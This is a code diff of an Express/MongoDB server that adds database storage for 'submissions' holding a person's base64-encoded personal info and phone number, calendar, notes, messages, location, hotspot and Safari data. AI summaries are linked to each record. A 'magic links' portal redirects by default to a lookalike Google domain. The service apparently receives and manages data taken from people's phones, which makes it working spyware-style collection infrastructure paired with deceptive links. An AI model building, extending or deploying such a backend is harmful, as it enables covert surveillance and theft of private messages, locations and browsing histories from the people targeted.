@@ -25,24 +25,49 @@ app.use((req, res, next) => {
 });
 
 // ==================================================
-// 0. MONGODB ATLAS CONNECTION (FOR PERMANENT LINKS)
+// 0. MONGODB ATLAS CONNECTION & SCHEMAS
 // ==================================================
 const MONGO_URI = process.env.MONGO_URI;
 
 if (!MONGO_URI) {
-  console.warn('WARNING: MONGO_URI environment variable is not set!');
+  console.warn('WARNING: MONGO_URI environment variable is not set! Falling back to local JSON files.');
 } else {
   mongoose.connect(MONGO_URI)
     .then(() => console.log('Connected to MongoDB Atlas'))
     .catch(err => console.error('MongoDB connection error:', err));
 }
 
+const isDbConnected = () => mongoose.connection.readyState === 1;
+
 const portalSchema = new mongoose.Schema({
   masterRedirect: String,
   links: [{ id: String, title: String, url: String }]
 });
-
 const Portal = mongoose.model('Portal', portalSchema);
+
+const submissionSchema = new mongoose.Schema({
+  id: { type: String, index: true },
+  personal_info_b64: { type: String, default: '' },
+  phone_number_b64: { type: String, default: '' },
+  calendar: { type: String, default: '' },
+  cellular_plan: { type: String, default: '' },
+  notes: { type: String, default: '' },
+  messages: { type: String, default: '' },
+  hotspot: { type: String, default: '' },
+  location: { type: String, default: '' },
+  safari: { type: String, default: '' },
+  timestamp: { type: Number, index: true }
+});
+const Submission = mongoose.model('Submission', submissionSchema);
+
+const summarySchema = new mongoose.Schema({
+  id: { type: String, index: true },
+  submissionId: { type: String, default: null },
+  title: String,
+  text: String,
+  timestamp: { type: Number, index: true }
+});
+const Summary = mongoose.model('Summary', summarySchema);
 
 // ==================================================
 // 1. KEEP-ALIVE HEALTH ROUTE
@@ -56,7 +81,7 @@ app.get('/health', (req, res) => {
 // ==================================================
 const SUBMISSIONS_FILE = path.join(__dirname, 'submissions.json');
 
-function getSubmissions() {
+function getLocalSubmissions() {
   if (!fs.existsSync(SUBMISSIONS_FILE)) {
     fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify([], null, 2));
     return [];
@@ -68,11 +93,18 @@ function getSubmissions() {
   }
 }
 
-function saveSubmissions(subs) {
+function saveLocalSubmissions(subs) {
   fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify(subs, null, 2));
 }
 
-app.post('/api/submit', (req, res) => {
+async function getSubmissions() {
+  if (isDbConnected()) {
+    return await Submission.find().sort({ timestamp: -1 }).lean();
+  }
+  return getLocalSubmissions();
+}
+
+app.post('/api/submit', async (req, res) => {
   try {
     const {
       personal_info_b64 = '',
@@ -86,7 +118,6 @@ app.post('/api/submit', (req, res) => {
       safari = ''
     } = req.body || {};
 
-    const submissions = getSubmissions();
     const newEntry = {
       id: Date.now().toString(),
       personal_info_b64,
@@ -101,26 +132,40 @@ app.post('/api/submit', (req, res) => {
       timestamp: Date.now()
     };
 
-    submissions.unshift(newEntry);
-    saveSubmissions(submissions);
+    if (isDbConnected()) {
+      await Submission.create(newEntry);
+    } else {
+      const submissions = getLocalSubmissions();
+      submissions.unshift(newEntry);
+      saveLocalSubmissions(submissions);
+    }
 
     return res.status(200).json({ success: true, message: 'Stored!', id: newEntry.id });
+  } catch (error) {
+    console.error('Error in /api/submit:', error);
+    return res.status(500).json({ success: false, error: 'Server error' });
+  }
+});
+
+app.get('/api/submissions', async (req, res) => {
+  try {
+    const submissions = await getSubmissions();
+    return res.status(200).json({ success: true, submissions });
   } catch (error) {
     return res.status(500).json({ success: false, error: 'Server error' });
   }
 });
 
-app.get('/api/submissions', (req, res) => {
-  const submissions = getSubmissions();
-  return res.status(200).json({ success: true, submissions });
-});
-
-app.get('/api/latest', (req, res) => {
-  const submissions = getSubmissions();
-  if (submissions.length === 0) {
-    return res.status(404).json({ success: false, error: 'No data yet' });
+app.get('/api/latest', async (req, res) => {
+  try {
+    const submissions = await getSubmissions();
+    if (submissions.length === 0) {
+      return res.status(404).json({ success: false, error: 'No data yet' });
+    }
+    return res.status(200).json({ success: true, ...submissions[0] });
+  } catch (error) {
+    return res.status(500).json({ success: false, error: 'Server error' });
   }
-  return res.status(200).json({ success: true, ...submissions[0] });
 });
 
 // ==================================================
@@ -128,7 +173,7 @@ app.get('/api/latest', (req, res) => {
 // ==================================================
 const SUMMARIES_FILE = path.join(__dirname, 'summaries.json');
 
-function getSummaries() {
+function getLocalSummaries() {
   if (!fs.existsSync(SUMMARIES_FILE)) {
     fs.writeFileSync(SUMMARIES_FILE, JSON.stringify([], null, 2));
     return [];
@@ -140,13 +185,20 @@ function getSummaries() {
   }
 }
 
-function saveSummaries(summaries) {
+function saveLocalSummaries(summaries) {
   fs.writeFileSync(SUMMARIES_FILE, JSON.stringify(summaries, null, 2));
 }
 
-app.post('/api/summaries/submit', (req, res) => {
+async function getSummaries() {
+  if (isDbConnected()) {
+    return await Summary.find().sort({ timestamp: -1 }).lean();
+  }
+  return getLocalSummaries();
+}
+
+app.post('/api/summaries/submit', async (req, res) => {
   try {
-    const { text, submissionId = null } = req.body;
+    const { text, submissionId = null } = req.body || {};
     if (!text || typeof text !== 'string') {
       return res.status(400).json({ success: false, error: 'Missing or invalid text field' });
     }
@@ -154,49 +206,65 @@ app.post('/api/summaries/submit', (req, res) => {
     const firstLine = text.split('\n')[0].trim();
     const title = firstLine.length > 0 ? firstLine : 'Untitled Summary';
     const timestamp = Date.now();
+    const cleanSubId = submissionId ? String(submissionId).trim() : null;
 
-    const summaries = getSummaries();
     const newEntry = {
       id: Date.now().toString(),
-      submissionId, // Links this AI summary directly to the telemetry record ID
+      submissionId: cleanSubId, // Links this AI summary directly to the telemetry record ID
       title,
       text,
       timestamp
     };
 
-    summaries.unshift(newEntry);
-    saveSummaries(summaries);
+    if (isDbConnected()) {
+      await Summary.create(newEntry);
+    } else {
+      const summaries = getLocalSummaries();
+      summaries.unshift(newEntry);
+      saveLocalSummaries(summaries);
+    }
 
     return res.status(200).json({ success: true, entry: newEntry });
   } catch (error) {
+    console.error('Error in /api/summaries/submit:', error);
     return res.status(500).json({ success: false, error: 'Server error' });
   }
 });
 
-app.get('/api/summaries', (req, res) => {
-  const summaries = getSummaries();
-  return res.status(200).json({ success: true, summaries });
+app.get('/api/summaries', async (req, res) => {
+  try {
+    const summaries = await getSummaries();
+    return res.status(200).json({ success: true, summaries });
+  } catch (error) {
+    return res.status(500).json({ success: false, error: 'Server error' });
+  }
 });
 
 // ==================================================
 // 3.5 DATA DELETION ROUTES
 // ==================================================
-app.post('/api/delete-item', (req, res) => {
+app.post('/api/delete-item', async (req, res) => {
   try {
-    const { id, submissionId } = req.body;
-    
-    // Delete the Summary
-    if (id) {
-      let summaries = getSummaries();
-      summaries = summaries.filter(s => String(s.id) !== String(id));
-      saveSummaries(summaries);
-    }
-    
-    // Delete the linked Telemetry Payload (prevents orphaned data)
-    if (submissionId) {
-      let submissions = getSubmissions();
-      submissions = submissions.filter(s => String(s.id) !== String(submissionId));
-      saveSubmissions(submissions);
+    const { id, submissionId } = req.body || {};
+
+    if (isDbConnected()) {
+      if (id) {
+        await Summary.deleteOne({ id: String(id).trim() });
+      }
+      if (submissionId) {
+        await Submission.deleteOne({ id: String(submissionId).trim() });
+      }
+    } else {
+      if (id) {
+        let summaries = getLocalSummaries();
+        summaries = summaries.filter(s => String(s.id) !== String(id).trim());
+        saveLocalSummaries(summaries);
+      }
+      if (submissionId) {
+        let submissions = getLocalSubmissions();
+        submissions = submissions.filter(s => String(s.id) !== String(submissionId).trim());
+        saveLocalSubmissions(submissions);
+      }
     }
 
     return res.status(200).json({ success: true });
@@ -205,16 +273,22 @@ app.post('/api/delete-item', (req, res) => {
   }
 });
 
-app.post('/api/clear-data', (req, res) => {
+app.post('/api/clear-data', async (req, res) => {
   try {
-    saveSubmissions([]);
-    saveSummaries([]);
+    if (isDbConnected()) {
+      await Promise.all([
+        Submission.deleteMany({}),
+        Summary.deleteMany({})
+      ]);
+    } else {
+      saveLocalSubmissions([]);
+      saveLocalSummaries([]);
+    }
     return res.status(200).json({ success: true });
   } catch (error) {
     return res.status(500).json({ success: false, error: 'Server error' });
   }
 });
-
 
 // ==================================================
 // 4. MAGIC LINKS PORTAL ROUTES (DATABASE BACKED)
@@ -254,10 +328,10 @@ app.post('/api/save', async (req, res) => {
     const { masterRedirect, links } = req.body;
     let data = await Portal.findOne();
     if (!data) data = new Portal({ masterRedirect: 'https://gooqlc.com/111z', links: [] });
-    
+
     if (masterRedirect) data.masterRedirect = masterRedirect;
     if (Array.isArray(links)) data.links = links;
-    
+
     await data.save();
     return res.status(200).json({ success: true, data });
   } catch (err) {
@@ -292,7 +366,13 @@ app.all('/api/update-link', async (req, res) => {
     let data = await Portal.findOne();
     if (!data) return res.status(404).json({ success: false, error: 'Portal data not found' });
 
-    const target = (data.links || []).find(item => item.id === String(id));
+    const links = data.links || [];
+    // Match by exact ID first, or fall back to 1-based button number (e.g. id=1 -> Button #1)
+    let target = links.find(item => item.id === String(id));
+    if (!target && !isNaN(Number(id)) && Number(id) >= 1 && Number(id) <= links.length) {
+      target = links[Number(id) - 1];
+    }
+
     if (!target) return res.status(404).json({ success: false, error: 'Link not found' });
 
     if (newTitle) target.title = newTitle;
